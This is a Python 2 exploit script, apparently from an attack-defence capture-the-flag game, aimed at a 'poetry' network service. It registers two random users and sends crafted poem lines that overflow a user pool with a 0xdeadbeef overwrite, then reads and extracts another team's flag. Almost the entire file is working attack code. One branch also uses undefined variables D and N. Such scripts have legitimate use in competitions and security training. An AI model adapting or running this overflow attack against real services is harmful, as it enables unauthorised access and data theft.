import random
import string
import socket
import sys
import re
import pexpect
import pexpect.fdpexpect

# To create random strings
POSSIBILITIES = string.ascii_uppercase + string.digits + string.ascii_lowercase
MORE_THAN_FLAG_LEN = 100
FLAG_REGEXP = "FLG\w*"

def register(c, login, password, high_level):
    c.expect(">")
    c.sendline("2")
    c.sendline(login)
    c.sendline(password)
    c.expect("Hmm, by the way, can you understand what is written there?")
    c.expect("0x[0-9a-z]*")
    hl = True
    if high_level:
        cipher_text = int(c.match.group(0), 16)
        plain_text = pow(cipher_text, D, N)
        c.sendline(str(plain_text))
        c.expect("Come in, my lord")
        hl = (c.match != None)
    else:
        c.sendline("1")
    c.expect("You have been successfully registered")
    return (c.match != None) & hl

def login_user(c, login, password):
    c.expect(">")
    c.sendline("1")
    c.sendline(login)
    c.sendline(password)
    c.expect("Logged as "+login)
    return (c.match != None)

def level_up(c, login, higher_level):
    c.expect(">")
    c.sendline("4")
    c.sendline(login)
    hl = True;
    if higher_level:
        c.expect("Level upped!")
        hl = (c.match != None)
    else:
        c.expect("Your level is too low")
    return (c.match != None) & hl

def write_poem(c, poem):
    c.expect(">")
    c.sendline("3")
    c.sendline(poem)
    for i in xrange(24):
        c.sendline("1")
    c.expect("Your poem is successfully posted")
    return (c.match != None)

def read_poem(c, login, poem, high_level):
    c.expect(">")
    c.sendline("5")
    c.sendline(login)
    hl = True
    if high_level:
        c.expect(poem)
        hl = (c.match != None)
    else:
        c.expect("Your level is too low")
    return (c.match != None) & hl



def exploit(ip, port, flag_id):
    login = ''.join(random.choice(POSSIBILITIES) for x in range(20))
    password = ''.join(random.choice(POSSIBILITIES) for x in range(20))

    while True:
        login2 = ''.join(random.choice(POSSIBILITIES) for x in range(20))
        password2 = ''.join(random.choice(POSSIBILITIES) for x in range(20))
        if (login2 != login) and (password2 != password):
            break

    if ip:
        conn = socket.create_connection((ip,port))
        c = pexpect.fdpexpect.fdspawn(conn.fileno())
    else:
        c = pexpect.spawn("../service/ro/poetry")
        c.logfile = sys.stdout

    # Register the second user
    ret = register(c, login2, password2, False)
    # Register the first user and login
    ret = register(c, login, password, False)
    login_user(c, login, password)
    # Overflow user_pool by poem
    p = ["a"*35]*24
    payload = 'b'*8+'c'*8+"\xef\xbe\xad\xde"
    p.append('a'*11+payload)

    c.expect(">")
    c.sendline("3")

    c.expect(">")
    for item in p:
        c.sendline(item)

    # Login the second user and read poem
    login_user(c, login2, password2)
    c.expect(">")
    c.sendline("5")
    c.expect("Which user do you want to look at?")
    c.sendline(flag_id)
    c.expect("------------------------")
    content = c.read(MORE_THAN_FLAG_LEN)
    f = re.search(FLAG_REGEXP, content)
    if f != None:
        content = f.group(0)
    else:
        content = ''
    if ip: conn.close()

    return { 'FLAG': content }


if __name__ == "__main__":
    print exploit(None, None, sys.argv[1])
